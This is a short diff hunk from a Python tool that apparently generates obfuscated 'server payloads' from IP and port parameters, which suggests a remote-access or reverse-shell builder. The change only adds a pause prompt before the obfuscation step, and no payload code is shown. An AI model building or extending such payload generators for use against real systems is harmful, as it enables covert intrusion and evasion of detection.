@@ -56,6 +56,8 @@ def create_server_payload(ip, port, host_ip, host_port):
         with open(f"{temp}\\{filename}.py", 'w'): pass
         with open(f"{temp}\\{filename}.py", 'r+') as f: f.write(replace_string)
 
+        input("\n\n[>>>] Enter anything to continue . . .\n")
+
         obfusacate(f"{temp}\\{filename}.py")
         shutil.move(f"{temp}\\{filename}.py", f"{os.getcwd()}\\{filename}.py")
 
